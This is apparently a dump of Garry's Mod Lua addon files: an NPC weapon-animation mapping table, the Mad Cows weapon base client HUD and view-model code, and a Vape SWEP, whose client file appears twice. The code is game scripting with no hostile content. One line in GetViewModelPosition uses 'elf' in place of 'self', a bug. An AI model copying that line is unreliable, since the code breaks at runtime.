		self.ActivityTranslateAI[ ACT_RELOAD ]				= ACT_RELOAD_SMG1
		self.ActivityTranslateAI[ ACT_IDLE ]				= ACT_IDLE_SMG1
		self.ActivityTranslateAI[ ACT_IDLE_ANGRY ]			= ACT_IDLE_ANGRY_SMG1

		self.ActivityTranslateAI[ ACT_WALK ]				= ACT_WALK_RIFLE
		self.ActivityTranslateAI[ ACT_WALK_AIM ]			= ACT_WALK_AIM_RIFLE

		self.ActivityTranslateAI[ ACT_IDLE_RELAXED ]		= ACT_IDLE_SMG1_RELAXED
		self.ActivityTranslateAI[ ACT_IDLE_STIMULATED ]		= ACT_IDLE_SMG1_STIMULATED
		self.ActivityTranslateAI[ ACT_IDLE_AGITATED ]		= ACT_IDLE_ANGRY_SMG1

		self.ActivityTranslateAI[ ACT_WALK_RELAXED ]		= ACT_WALK_RIFLE_RELAXED
		self.ActivityTranslateAI[ ACT_WALK_STIMULATED ]		= ACT_WALK_RIFLE_STIMULATED
		self.ActivityTranslateAI[ ACT_WALK_AGITATED ]		= ACT_WALK_AIM_RIFLE

		self.ActivityTranslateAI[ ACT_RUN_RELAXED ]			= ACT_RUN_RIFLE_RELAXED
		self.ActivityTranslateAI[ ACT_RUN_STIMULATED ]		= ACT_RUN_RIFLE_STIMULATED
		self.ActivityTranslateAI[ ACT_RUN_AGITATED ]		= ACT_RUN_AIM_RIFLE

		self.ActivityTranslateAI[ ACT_IDLE_AIM_RELAXED ]		= ACT_IDLE_SMG1_RELAXED
		self.ActivityTranslateAI[ ACT_IDLE_AIM_STIMULATED ]		= ACT_IDLE_AIM_RIFLE_STIMULATED
		self.ActivityTranslateAI[ ACT_IDLE_AIM_AGITATED ]		= ACT_IDLE_ANGRY_SMG1

		self.ActivityTranslateAI[ ACT_WALK_AIM_RELAXED ]		= ACT_WALK_RIFLE_RELAXED
		self.ActivityTranslateAI[ ACT_WALK_AIM_STIMULATED ]		= ACT_WALK_AIM_RIFLE_STIMULATED
		self.ActivityTranslateAI[ ACT_WALK_AIM_AGITATED ]		= ACT_WALK_AIM_RIFLE

		self.ActivityTranslateAI[ ACT_RUN_AIM_RELAXED ]			= ACT_RUN_RIFLE_RELAXED
		self.ActivityTranslateAI[ ACT_RUN_AIM_STIMULATED ]		= ACT_RUN_AIM_RIFLE_STIMULATED
		self.ActivityTranslateAI[ ACT_RUN_AIM_AGITATED ]		= ACT_RUN_AIM_RIFLE

		self.ActivityTranslateAI[ ACT_WALK_CROUCH ]				= ACT_WALK_CROUCH_RIFLE
		self.ActivityTranslateAI[ ACT_WALK_CROUCH_AIM ]			= ACT_WALK_CROUCH_AIM_RIFLE
		self.ActivityTranslateAI[ ACT_RUN ]						= ACT_RUN_RIFLE
		self.ActivityTranslateAI[ ACT_RUN_AIM ]					= ACT_RUN_AIM_RIFLE
		self.ActivityTranslateAI[ ACT_RUN_CROUCH ]				= ACT_RUN_CROUCH_RIFLE
		self.ActivityTranslateAI[ ACT_RUN_CROUCH_AIM ]			= ACT_RUN_CROUCH_AIM_RIFLE
		self.ActivityTranslateAI[ ACT_GESTURE_RANGE_ATTACK1 ]	= ACT_GESTURE_RANGE_ATTACK_AR2
		self.ActivityTranslateAI[ ACT_RANGE_ATTACK1_LOW ]		= ACT_RANGE_ATTACK_SMG1_LOW
		self.ActivityTranslateAI[ ACT_COVER_LOW ]				= ACT_COVER_SMG1_LOW
		self.ActivityTranslateAI[ ACT_RANGE_AIM_LOW ]			= ACT_RANGE_AIM_AR2_LOW
		self.ActivityTranslateAI[ ACT_RELOAD_LOW ]				= ACT_RELOAD_SMG1_LOW
		self.ActivityTranslateAI[ ACT_GESTURE_RELOAD ]			= ACT_GESTURE_RELOAD_SMG1

		-- Extra overrides for SMG holdtype
		if ( t == "smg" ) then
			self.ActivityTranslateAI[ ACT_RANGE_ATTACK1 ]			= ACT_RANGE_ATTACK_SMG1
			self.ActivityTranslateAI[ ACT_GESTURE_RANGE_ATTACK1 ]	= ACT_GESTURE_RANGE_ATTACK_SMG1
			self.ActivityTranslateAI[ ACT_RANGE_AIM_LOW ]			= ACT_RANGE_AIM_SMG1_LOW
		end

		return
	end

	if ( t == "shotgun" || t == "crossbow" ) then
		self.ActivityTranslateAI[ ACT_IDLE ]			= ACT_IDLE_SMG1

		self.ActivityTranslateAI[ ACT_RANGE_ATTACK1 ]	= ACT_RANGE_ATTACK_SHOTGUN
		self.ActivityTranslateAI[ ACT_RELOAD ]			= ACT_RELOAD_SHOTGUN
		self.ActivityTranslateAI[ ACT_WALK ]			= ACT_WALK_RIFLE
		self.ActivityTranslateAI[ ACT_IDLE_ANGRY ]		= ACT_IDLE_ANGRY_SHOTGUN

		self.ActivityTranslateAI[ ACT_IDLE_RELAXED ]	= ACT_IDLE_SHOTGUN_RELAXED
		self.ActivityTranslateAI[ ACT_IDLE_STIMULATED ]	= ACT_IDLE_SHOTGUN_STIMULATED
		self.ActivityTranslateAI[ ACT_IDLE_AGITATED ]	= ACT_IDLE_SHOTGUN_AGITATED

		self.ActivityTranslateAI[ ACT_WALK_RELAXED ]	= ACT_WALK_RIFLE_RELAXED
		self.ActivityTranslateAI[ ACT_WALK_STIMULATED ]	= ACT_WALK_RIFLE_STIMULATED
		self.ActivityTranslateAI[ ACT_WALK_AGITATED ]	= ACT_WALK_AIM_RIFLE

		self.ActivityTranslateAI[ ACT_RUN_RELAXED ]		= ACT_RUN_RIFLE_RELAXED
		self.ActivityTranslateAI[ ACT_RUN_STIMULATED ]	= ACT_RUN_RIFLE_STIMULATED
		self.ActivityTranslateAI[ ACT_RUN_AGITATED ]	= ACT_RUN_AIM_RIFLE

		self.ActivityTranslateAI[ ACT_IDLE_AIM_RELAXED ]	= ACT_IDLE_SMG1_RELAXED
		self.ActivityTranslateAI[ ACT_IDLE_AIM_STIMULATED ]	= ACT_IDLE_AIM_RIFLE_STIMULATED
		self.ActivityTranslateAI[ ACT_IDLE_AIM_AGITATED ]	= ACT_IDLE_ANGRY_SMG1

		self.ActivityTranslateAI[ ACT_WALK_AIM_RELAXED ]	= ACT_WALK_RIFLE_RELAXED
		self.ActivityTranslateAI[ ACT_WALK_AIM_STIMULATED ]	= ACT_WALK_AIM_RIFLE_STIMULATED
		self.ActivityTranslateAI[ ACT_WALK_AIM_AGITATED ]	= ACT_WALK_AIM_RIFLE

		self.ActivityTranslateAI[ ACT_RUN_AIM_RELAXED ]		= ACT_RUN_RIFLE_RELAXED
		self.ActivityTranslateAI[ ACT_RUN_AIM_STIMULATED ]	= ACT_RUN_AIM_RIFLE_STIMULATED
		self.ActivityTranslateAI[ ACT_RUN_AIM_AGITATED ]	= ACT_RUN_AIM_RIFLE

		self.ActivityTranslateAI[ ACT_WALK_AIM ]				= ACT_WALK_AIM_SHOTGUN
		self.ActivityTranslateAI[ ACT_WALK_CROUCH ]				= ACT_WALK_CROUCH_RIFLE
		self.ActivityTranslateAI[ ACT_WALK_CROUCH_AIM ]			= ACT_WALK_CROUCH_AIM_RIFLE
		self.ActivityTranslateAI[ ACT_RUN ]						= ACT_RUN_RIFLE
		self.ActivityTranslateAI[ ACT_RUN_AIM ]					= ACT_RUN_AIM_SHOTGUN
		self.ActivityTranslateAI[ ACT_RUN_CROUCH ]				= ACT_RUN_CROUCH_RIFLE
		self.ActivityTranslateAI[ ACT_RUN_CROUCH_AIM ]			= ACT_RUN_CROUCH_AIM_RIFLE
		self.ActivityTranslateAI[ ACT_GESTURE_RANGE_ATTACK1 ]	= ACT_GESTURE_RANGE_ATTACK_SHOTGUN
		self.ActivityTranslateAI[ ACT_RANGE_ATTACK1_LOW ]		= ACT_RANGE_ATTACK_SHOTGUN_LOW
		self.ActivityTranslateAI[ ACT_RELOAD_LOW ]				= ACT_RELOAD_SHOTGUN_LOW
		self.ActivityTranslateAI[ ACT_GESTURE_RELOAD ]			= ACT_GESTURE_RELOAD_SHOTGUN

		return
	end

	if ( t == "rpg" ) then
		self.ActivityTranslateAI[ ACT_RANGE_ATTACK1 ]		= ACT_RANGE_ATTACK_RPG

		self.ActivityTranslateAI[ ACT_IDLE_RELAXED ]		= ACT_IDLE_RPG_RELAXED
		self.ActivityTranslateAI[ ACT_IDLE_STIMULATED ]		= ACT_IDLE_ANGRY_RPG
		self.ActivityTranslateAI[ ACT_IDLE_AGITATED ]		= ACT_IDLE_ANGRY_RPG

		self.ActivityTranslateAI[ ACT_IDLE ]				= ACT_IDLE_RPG
		self.ActivityTranslateAI[ ACT_IDLE_ANGRY ]			= ACT_IDLE_ANGRY_RPG
		self.ActivityTranslateAI[ ACT_WALK ]				= ACT_WALK_RPG
		self.ActivityTranslateAI[ ACT_WALK_CROUCH ]			= ACT_WALK_CROUCH_RPG
		self.ActivityTranslateAI[ ACT_RUN ]					= ACT_RUN_RPG
		self.ActivityTranslateAI[ ACT_RUN_CROUCH ]			= ACT_RUN_CROUCH_RPG
		self.ActivityTranslateAI[ ACT_COVER_LOW ]			= ACT_COVER_LOW_RPG

		return
	end

end

--PATH addons/skin_nier/lua/weapons/weapon_mad_base/cl_init.lua:
include('shared.lua')

SWEP.PrintName			= "Mad Cows Weapon Base"			// 'Nice' Weapon name (Shown on HUD)	
SWEP.Slot				= 0							// Slot in the weapon selection menu
SWEP.SlotPos			= 1							// Position in the slot
SWEP.DrawAmmo			= true						// Should draw the default HL2 ammo counter?
SWEP.DrawCrosshair		= false 						// Should draw the default crosshair?
SWEP.DrawWeaponInfoBox		= true						// Should draw the weapon info box?
SWEP.BounceWeaponIcon   	= false						// Should the weapon icon bounce?
SWEP.SwayScale			= 1.0							// The scale of the viewmodel sway
SWEP.BobScale			= 1.0							// The scale of the viewmodel bob

SWEP.RenderGroup 			= RENDERGROUP_OPAQUE

/*---------------------------------------------------------
   Name: SWEP:SecondDrawHUD()
---------------------------------------------------------*/
function SWEP:SecondDrawHUD()
end

/*---------------------------------------------------------
   Name: SWEP:DrawHUD()
   Desc: You can draw to the HUD here. It will only draw when
	   the client has the weapon deployed.
---------------------------------------------------------*/
cl_crosshair_r 		= CreateClientConVar("mad_crosshair_r", 255, true, false)		// Red
cl_crosshair_g 		= CreateClientConVar("mad_crosshair_g", 255, true, false)		// Green
cl_crosshair_b 		= CreateClientConVar("mad_crosshair_b", 255, true, false)		// Blue
cl_crosshair_a 		= CreateClientConVar("mad_crosshair_a", 200, true, false)		// Alpha
cl_crosshair_l 		= CreateClientConVar("mad_crosshair_l", 30, true, false)		// Lenght
cl_crosshair_t 		= CreateClientConVar("mad_crosshair_t", 1, true, false)		// Enable/Disable

function SWEP:DrawHUD()

	self:SecondDrawHUD()
	self:DrawFuelHUD()

	if (self.Weapon:GetDTBool(1)) or (cl_crosshair_t:GetBool() == false) or (LocalPlayer():InVehicle()) then return end

	local hitpos = util.TraceLine ({
		start = LocalPlayer():GetShootPos(),
		endpos = LocalPlayer():GetShootPos() + LocalPlayer():GetAimVector() * 4096,
		filter = LocalPlayer(),
		mask = MASK_SHOT
	}).HitPos

	local screenpos = hitpos:ToScreen()
	
	local x = screenpos.x
	local y = screenpos.y
	
	if self.Primary.Cone < 0.005 then
		self.Primary.Cone = 0.005
	end
	
	local gap = ((self.Primary.Cone * 275) + (((self.Primary.Cone * 275) * (ScrH() / 720))) * (1 / self:CrosshairAccuracy())) * 0.75

	gap = math.Clamp(gap, 0, (ScrH() / 2) - 100)
	local length = cl_crosshair_l:GetInt()

	self:DrawCrosshairHUD(x - gap - length, y - 1, length, 3) 	// Left
	self:DrawCrosshairHUD(x + gap + 1, y - 1, length, 3) 		// Right
 	self:DrawCrosshairHUD(x - 1, y - gap - length, 3, length) 	// Top 
 	self:DrawCrosshairHUD(x - 1, y + gap + 1, 3, length) 		// Bottom
end

/*---------------------------------------------------------
   Name: SWEP:DrawCrosshairHUD()
---------------------------------------------------------*/
function SWEP:DrawCrosshairHUD(x, y, width, height)

	surface.SetDrawColor(0, 0, 0, cl_crosshair_a:GetInt() / 2)
	surface.DrawRect(x, y, width, height)
	
	surface.SetDrawColor(cl_crosshair_r:GetInt(), cl_crosshair_g:GetInt(), cl_crosshair_b:GetInt(), cl_crosshair_a:GetInt())
	surface.DrawRect(x + 1, y + 1, width - 2, height - 2)
end

/*---------------------------------------------------------
   Name: SWEP:DrawFuelHUD()
---------------------------------------------------------*/
// Based on the Condition SWEPs HUD made by SB Spy

function SWEP:DrawFuelHUD()

	if (self.Owner:GetNetworkedInt("Fuel") > 0) then
		
		local x, y, w, h, space, t, r, n, txt, poly, a

		if not self.BaseClass.WrenchData then
			t = {}
			
			t.Poly = {
					{x = 0,	y = 0,	u = 0,	v = 0},
					{x = 0,	y = 0,	u = 0,	v = 0},
					{x = 0,	y = 0,	u = 0,	v = 0},
					{x = 0,	y = 0,	u = 0,	v = 0},
				}
				
			w = ScreenScale(36)
			h = ScreenScale(36)

			space = ScreenScale(20)

			x = ScrW() - w - 10
			y = ScrH() / 2.0 - h / 2

			t.Origin = {}
			
			t.Origin.x = x
			t.Origin.y = y
			t.Origin.w = w
			t.Origin.h = h
			
			t.Poly[1].x = x
			
			t.Poly[2].x = x + w
			t.Poly[2].u = 1
			
			t.Poly[3].x = x + w
			t.Poly[3].y = y + h
			t.Poly[3].u = 1
			t.Poly[3].v = 1
			
			t.Poly[4].x = x
			t.Poly[4].y = y + h
			t.Poly[4].v = 1
			
			t.Percent = 1
			t.Color = Color(255, 255, 255, 255)
			t.Shadow = Color(000, 000, 000, 255)
			t.Texture = surface.GetTextureID("vgui/entities/ent_mad_fuel_mini")
			
			self.BaseClass.FuelData = t
		end
		
		x = self.BaseClass.FuelData.Origin.x
		y = self.BaseClass.FuelData.Origin.y
		w = self.BaseClass.FuelData.Origin.w
		h = self.BaseClass.FuelData.Origin.h
		poly = self.BaseClass.FuelData.Poly
		
		self.BaseClass.FuelData.Percent = self.Owner:GetNetworkedInt("Fuel")
		
		a = self.BaseClass.FuelData.Percent / 100
		
		poly[1].y = y + h * (1 - a)
		poly[1].v = 1 - a

		poly[2].y = y + h * (1 - a)
		poly[2].v = 1 - a
		
		surface.SetTexture(self.BaseClass.FuelData.Texture)
		surface.SetDrawColor(000, 000, 000, 255)
		surface.DrawTexturedRect(x, y, w, h)
		
		surface.SetDrawColor(255, 255, 255, 255)
		surface.DrawPoly(poly)
		
		surface.SetFont("TargetIDSmall")
		
		txt = math.Round(self.BaseClass.FuelData.Percent) .. "%"
		
		r, n = surface.GetTextSize(txt)
		
		draw.SimpleTextOutlined(txt, "TargetIDSmall", poly[2].x - w * 0.5, y - n, self.BaseClass.FuelData.Color, TEXT_ALIGN_CENTER, TEXT_ALIGN_TOP, 1, self.BaseClass.FuelData.Shadow)
	end
end

/*---------------------------------------------------------
   Name: SWEP:DrawWeaponSelection()
   Desc: Checks the objects before any action is taken.
	   This is to make sure that the entities haven't been removed.
---------------------------------------------------------*/
function SWEP:DrawWeaponSelection(x, y, wide, tall, alpha)
	
	// Set us up the texture
	surface.SetDrawColor(255, 255, 255, alpha)
	surface.SetTexture(self.WepSelectIcon)
	
	// Lets get a sin wave to make it bounce
	local fsin = 0
	
	if (self.BounceWeaponIcon == true) then
		fsin = math.sin(CurTime() * 10) * 5
	end
	
	// Borders
	y = y + 10
	x = x + 10
	wide = wide - 20
	
	// Draw that mother
	surface.DrawTexturedRect(x + (fsin), y - (fsin), wide - fsin * 2, (wide / 2) + (fsin))
	
	// Draw weapon info box
	self:PrintWeaponInfo(x + wide + 20, y + tall * 0.95, alpha)
end

/*---------------------------------------------------------
   Name: SWEP:PrintWeaponInfo()
   Desc: Draws the weapon info box.
---------------------------------------------------------*/
function SWEP:PrintWeaponInfo(x, y, alpha)

	if (self.DrawWeaponInfoBox == false) then return end

	if (self.InfoMarkup == nil) then
		local str
		local title_color = "<color = 130, 0, 0, 255>"
		local text_color = "<color = 255, 255, 255, 200>"
		
		str = "<font=HudSelectionText>"
		if (self.Author != "") then str = str .. title_color .. "Author:</color>\t" .. text_color .. self.Author .. "</color>\n" end
		if (self.Contact != "") then str = str .. title_color .. "Contact:</color>\t" .. text_color .. self.Contact .. "</color>\n\n" end
		if (self.Purpose != "") then str = str .. title_color .. "Purpose:</color>\n" .. text_color .. self.Purpose .. "</color>\n\n" end
		if (self.Instructions!= "") then str = str .. title_color .. "Instructions:</color>\n" .. text_color .. self.Instructions .. "</color>\n" end
		str = str .. "</font>"
		
		self.InfoMarkup = markup.Parse(str, 250)
	end

	alpha = 180
	
	surface.SetDrawColor(0, 0, 0, alpha)
	surface.SetTexture(self.SpeechBubbleLid)
	
	surface.DrawTexturedRect(x, y - 69.5, 128, 64) 
	draw.RoundedBox(8, x - 5, y - 6, 260, self.InfoMarkup:GetHeight() + 18, Color(0, 0, 0, alpha))
	
	self.InfoMarkup:Draw(x + 5, y + 5, nil, nil, alpha)
end

/*---------------------------------------------------------
   Name: SWEP:GetViewModelPosition()
   Desc: Allows you to re-position the view model.
---------------------------------------------------------*/
local IRONSIGHT_TIME = 0.2

function SWEP:GetViewModelPosition(pos, ang)
	
	ang:RotateAroundAxis(ang:Right(), 	self.HoldingAng.x)
	ang:RotateAroundAxis(ang:Up(), 	self.HoldingAng.y)
	ang:RotateAroundAxis(ang:Forward(), self.HoldingAng.z)
	
	local pRight 	= ang:Right()
	local pUp 		= ang:Up()
	local pForward 	= ang:Forward()
	
	pos = pos + self.HoldingPos.x * pRight
	pos = pos + self.HoldingPos.y * pForward
	pos = pos + self.HoldingPos.z * pUp

	local bIron = self.Weapon:GetDTBool(1)	
	
	local DashDelta = 0
	
	if (self.Owner:KeyDown(IN_SPEED) or self.Weapon:GetDTBool(0)) then
		if (!self.DashStartTime) then
			self.DashStartTime = CurTime()
		end
		
		DashDelta = math.Clamp(((CurTime() - self.DashStartTime) / 0.1) ^ 1.2, 0, 1)
	else
		if (self.DashStartTime) then
			self.DashEndTime = CurTime()
		end
	
		if (self.DashEndTime) then
			DashDelta = math.Clamp(((CurTime() - self.DashEndTime) / 0.1) ^ 1.2, 0, 1)
			DashDelta = 1 - DashDelta
			if (DashDelta == 0) then self.DashEndTime = nil end
		end
	
		self.DashStartTime = nil
	end
	
	if (DashDelta) then
		local Down = ang:Up() * -1
		local Right = ang:Right()
		local Forward = ang:Forward()
	
		local bUseVector = false
		
		if(!self.RunArmAngle.pitch) then
			bUseVector = true
		end
		
		if (bUseVector == true) then
			ang:RotateAroundAxis(ang:Right(), self.RunArmAngle.x * DashDelta)
			ang:RotateAroundAxis(ang:Up(), self.RunArmAngle.y * DashDelta)
			ang:RotateAroundAxis(ang:Forward(), self.RunArmAngle.z * DashDelta)
			
			pos = pos + self.RunArmOffset.x * ang:Right() * DashDelta 
			pos = pos + self.RunArmOffset.y * ang:Forward() * DashDelta 
			pos = pos + self.RunArmOffset.z * ang:Up() * DashDelta 
		else
			ang:RotateAroundAxis(Right, elf.RunArmAngle.pitch * DashDelta)
			ang:RotateAroundAxis(Down, self.RunArmAngle.yaw * DashDelta)
			ang:RotateAroundAxis(Forward, self.RunArmAngle.roll * DashDelta)

			pos = pos + (Down * self.RunArmOffset.x + Forward * self.RunArmOffset.y + Right * self.RunArmOffset.z) * DashDelta			
		end
		
		if (self.DashEndTime) then
			return pos, ang
		end
	end

	if (bIron != self.bLastIron) then
		self.bLastIron = bIron 
		self.fIronTime = CurTime()
		
		if (bIron) then 
			self.SwayScale 	= 0.3
			self.BobScale 	= 0.1
		else 
			self.SwayScale 	= 1.0
			self.BobScale 	= 1.0
		end
	
	end
	
	local fIronTime = self.fIronTime or 0

	if (!bIron && fIronTime < CurTime() - IRONSIGHT_TIME) then 
		return pos, ang
	end
	
	local Mul = 1.0
	
	if (fIronTime > CurTime() - IRONSIGHT_TIME) then
		Mul = math.Clamp((CurTime() - fIronTime) / IRONSIGHT_TIME, 0, 1)

		if (!bIron) then Mul = 1 - Mul end
	end

	if (self.IronSightsAng) then
		ang = ang * 1
		ang:RotateAroundAxis(ang:Right(), 	self.IronSightsAng.x * Mul)
		ang:RotateAroundAxis(ang:Up(), 	self.IronSightsAng.y * Mul)
		ang:RotateAroundAxis(ang:Forward(), self.IronSightsAng.z * Mul)
	end
	
	local Right 	= ang:Right()
	local Up 		= ang:Up()
	local Forward 	= ang:Forward()
	
	pos = pos + self.IronSightsPos.x * Right * Mul
	pos = pos + self.IronSightsPos.y * Forward * Mul
	pos = pos + self.IronSightsPos.z * Up * Mul
	
	return pos, ang
end

/*---------------------------------------------------------
   Name: SWEP:AdjustMouseSensitivity()
   Desc: Allows you to adjust the mouse sensitivity.
---------------------------------------------------------*/
function SWEP:AdjustMouseSensitivity()

	return nil
end

/*---------------------------------------------------------
   Name: SWEP:GetTracerOrigin()
   Desc: Allows you to override where the tracer comes from (in first person view)
	   returning anything but a vector indicates that you want the default action.
---------------------------------------------------------*/
function SWEP:GetTracerOrigin()

	if (self.Weapon:GetDTBool(1)) then
		local pos = self:GetOwner():EyePos() + self:GetOwner():EyeAngles():Up() * -4
		return pos
	end
end
--PATH addons/vapeswep/lua/weapons/weapon_vape/shared.lua:
-- weapon_vape/shared.lua
-- Defines common shared code/defaults for Vape SWEP

-- Vape SWEP by Swamp Onions - http://steamcommunity.com/id/swamponions/

SWEP.Author = "Swamp Onions"

SWEP.Instructions = "LMB: Rip Fat Clouds\n (Hold and release)\nRMB & Reload: Play Sounds\n\nVape Nation!"

SWEP.PrintName = "Vape"

SWEP.IconLetter	= "V"
SWEP.Category = "Vapes"
SWEP.Slot = 1
SWEP.SlotPos = 0

SWEP.ViewModelFOV = 62 --default

SWEP.WepSelectIcon = surface and surface.GetTextureID("vape_icon")
SWEP.BounceWeaponIcon = false

SWEP.ViewModel = "models/swamponions/vape.mdl"
SWEP.WorldModel = "models/swamponions/vape.mdl"
SWEP.Spawnable = true
SWEP.AdminOnly = false

SWEP.Primary.Clipsize = -1
SWEP.Primary.DefaultClip = -1
SWEP.Primary.Automatic = true
SWEP.Primary.Ammo = "none"

SWEP.Secondary.Clipsize = -1
SWEP.Secondary.DefaultClip = -1
SWEP.Secondary.Automatic = false
SWEP.Secondary.Ammo = "none"

SWEP.DrawAmmo = false
SWEP.HoldType = "slam"

SWEP.VapeID = 1

function SWEP:Deploy()
	self:SetHoldType("slam")
end

function SWEP:PrimaryAttack()
	if SERVER then
		VapeUpdate(self.Owner, self.VapeID)
	end
	self.Weapon:SetNextPrimaryFire(CurTime() + 0.1)
end

function SWEP:SecondaryAttack()
	if GetConVar("vape_block_sounds"):GetBool() then return end
	
	local pitch = 100 + (self.SoundPitchMod or 0) + (self.Owner:Crouching() and 40 or 0)
	self:EmitSound("vapegogreen.wav", 80, pitch + math.Rand(-5,5))
	if SERVER then
		net.Start("VapeTalking")
		net.WriteEntity(self.Owner)
		net.WriteFloat(CurTime() + (0.6*100/pitch))
		net.Broadcast()
	end
end

function SWEP:Reload()
	if GetConVar("vape_block_sounds"):GetBool() then return end

	if self.reloading then return end
	self.reloading=true
	timer.Simple(0.5, function() self.reloading=false end)
	local pitch = 100 + (self.SoundPitchMod or 0) + (self.Owner:Crouching() and 40 or 0)
	self:EmitSound("vapenaysh.wav", 80, pitch + math.Rand(-5,5))
	if SERVER then
		net.Start("VapeTalking")
		net.WriteEntity(self.Owner)
		net.WriteFloat(CurTime() + (2.2*100/pitch))
		net.Broadcast()
	end
end

function SWEP:Holster()
	if SERVER and IsValid(self.Owner) then
		ReleaseVape(self.Owner)
	end
	return true
end

SWEP.OnDrop = SWEP.Holster
SWEP.OnRemove = SWEP.Holster
--PATH addons/vapeswep/lua/weapons/weapon_vape/cl_init.lua:
-- weapon_vape/cl_init.lua
-- Defines common clientside code/defaults for Vape SWEP

-- Vape SWEP by Swamp Onions - http://steamcommunity.com/id/swamponions/

include('shared.lua')

function SWEP:DrawWorldModel()
	local ply = self:GetOwner()

	local vapeScale = self.VapeScale or 1
	self:SetModelScale(vapeScale, 0) 
	self:SetSubMaterial()

	if IsValid(ply) then
		local modelStr = ply:GetModel():sub(1,17)
		local isPony = modelStr=="models/ppm/player" or modelStr=="models/mlp/player" or modelStr=="models/cppm/playe"

		local bn = isPony and "LrigScull" or "ValveBiped.Bip01_R_Hand"
		if ply.vapeArmFullyUp then bn ="ValveBiped.Bip01_Head1" end
		local bon = ply:LookupBone(bn) or 0

		local opos = self:GetPos()
		local oang = self:GetAngles()
		local bp,ba = ply:GetBonePosition(bon)
		if bp then opos = bp end
		if ba then oang = ba end

		if isPony then
			--pony position
			opos = opos + (oang:Forward()*19.4) + (oang:Right()*-4.36) + (oang:Up()*-2.5)
			oang:RotateAroundAxis(oang:Right(),80)
			oang:RotateAroundAxis(oang:Forward(),12)
			oang:RotateAroundAxis(oang:Up(),20)
			opos = opos + (oang:Up()*(2.3+((vapeScale-1)*-10.25)))
		else
			if ply.vapeArmFullyUp then
				--head position
				opos = opos + (oang:Forward()*0.74) + (oang:Right()*15) + (oang:Up()*2)
				oang:RotateAroundAxis(oang:Forward(),-100)
				oang:RotateAroundAxis(oang:Up(),100)
				opos = opos + (oang:Up()*(vapeScale-1)*-10.25)
			else
				--hand position
				oang:RotateAroundAxis(oang:Forward(),90)
				oang:RotateAroundAxis(oang:Right(),90)
				opos = opos + (oang:Forward()*2) + (oang:Up()*-4.5) + (oang:Right()*-2)
				oang:RotateAroundAxis(oang:Forward(),69)
				oang:RotateAroundAxis(oang:Up(),10)
				opos = opos + (oang:Up()*(vapeScale-1)*-10.25)
				if self:GetClass()=="weapon_vape_butterfly" then
					opos = opos + (oang:Up()*6)
					oang:RotateAroundAxis(oang:Right(),Lerp(ply.vapeArmUpAmt or 0,0,-360))
					opos = opos + (oang:Up()*-6)
				end
			end
		end
		self:SetupBones()

		local mrt = self:GetBoneMatrix(0)
		if mrt then
		mrt:SetTranslation(opos)
		mrt:SetAngles(oang)

		self:SetBoneMatrix(0, mrt)
		end
	end

	self:DrawModel()
end

function SWEP:GetViewModelPosition(pos, ang)
	--mouth pos
	local vmpos1=self.VapeVMPos1 or Vector(18.5,-3.4,-3)
	local vmang1=self.VapeVMAng1 or Vector(170,-105,82)
	--hand pos
	local vmpos2=self.VapeVMPos2 or Vector(24,-8,-11.2)
	local vmang2=self.VapeVMAng2 or Vector(170,-108,132)

	if not LocalPlayer().vapeArmTime then LocalPlayer().vapeArmTime=0 end
	local lerp = math.Clamp((os.clock()-LocalPlayer().vapeArmTime)*3,0,1)
	if LocalPlayer().vapeArm then lerp = 1-lerp end
	local newpos = LerpVector(lerp,vmpos1,vmpos2)
	local newang = LerpVector(lerp,vmang1,vmang2)
	--I have a good reason for doing it like this
	newang = Angle(newang.x,newang.y,newang.z) 
	
	pos,ang = LocalToWorld(newpos,newang,pos,ang)
	return pos, ang
end
--PATH addons/vapeswep/lua/weapons/weapon_vape/cl_init.lua:
-- weapon_vape/cl_init.lua
-- Defines common clientside code/defaults for Vape SWEP

-- Vape SWEP by Swamp Onions - http://steamcommunity.com/id/swamponions/

include('shared.lua')

function SWEP:DrawWorldModel()
	local ply = self:GetOwner()

	local vapeScale = self.VapeScale or 1
	self:SetModelScale(vapeScale, 0) 
	self:SetSubMaterial()

	if IsValid(ply) then
		local modelStr = ply:GetModel():sub(1,17)
		local isPony = modelStr=="models/ppm/player" or modelStr=="models/mlp/player" or modelStr=="models/cppm/playe"

		local bn = isPony and "LrigScull" or "ValveBiped.Bip01_R_Hand"
		if ply.vapeArmFullyUp then bn ="ValveBiped.Bip01_Head1" end
		local bon = ply:LookupBone(bn) or 0

		local opos = self:GetPos()
		local oang = self:GetAngles()
		local bp,ba = ply:GetBonePosition(bon)
		if bp then opos = bp end
		if ba then oang = ba end

		if isPony then
			--pony position
			opos = opos + (oang:Forward()*19.4) + (oang:Right()*-4.36) + (oang:Up()*-2.5)
			oang:RotateAroundAxis(oang:Right(),80)
			oang:RotateAroundAxis(oang:Forward(),12)
			oang:RotateAroundAxis(oang:Up(),20)
			opos = opos + (oang:Up()*(2.3+((vapeScale-1)*-10.25)))
		else
			if ply.vapeArmFullyUp then
				--head position
				opos = opos + (oang:Forward()*0.74) + (oang:Right()*15) + (oang:Up()*2)
				oang:RotateAroundAxis(oang:Forward(),-100)
				oang:RotateAroundAxis(oang:Up(),100)
				opos = opos + (oang:Up()*(vapeScale-1)*-10.25)
			else
				--hand position
				oang:RotateAroundAxis(oang:Forward(),90)
				oang:RotateAroundAxis(oang:Right(),90)
				opos = opos + (oang:Forward()*2) + (oang:Up()*-4.5) + (oang:Right()*-2)
				oang:RotateAroundAxis(oang:Forward(),69)
				oang:RotateAroundAxis(oang:Up(),10)
				opos = opos + (oang:Up()*(vapeScale-1)*-10.25)
				if self:GetClass()=="weapon_vape_butterfly" then
					opos = opos + (oang:Up()*6)
					oang:RotateAroundAxis(oang:Right(),Lerp(ply.vapeArmUpAmt or 0,0,-360))
					opos = opos + (oang:Up()*-6)
				end
			end
		end
		self:SetupBones()

		local mrt = self:GetBoneMatrix(0)
		if mrt then
		mrt:SetTranslation(opos)
		mrt:SetAngles(oang)

		self:SetBoneMatrix(0, mrt)
		end
	end

	self:DrawModel()
end

function SWEP:GetViewModelPosition(pos, ang)
	--mouth pos
	local vmpos1=self.VapeVMPos1 or Vector(18.5,-3.4,-3)
	local vmang1=self.VapeVMAng1 or Vector(170,-105,82)
	--hand pos
	local vmpos2=self.VapeVMPos2 or Vector(24,-8,-11.2)
	local vmang2=self.VapeVMAng2 or Vector(170,-108,132)

	if not LocalPlayer().vapeArmTime then LocalPlayer().vapeArmTime=0 end
	local lerp = math.Clamp((os.clock()-LocalPlayer().vapeArmTime)*3,0,1)
	if LocalPlayer().vapeArm then lerp = 1-lerp end
	local newpos = LerpVector(lerp,vmpos1,vmpos2)
	local newang = LerpVector(lerp,vmang1,vmang2)
	--I have a good reason for doing it like this
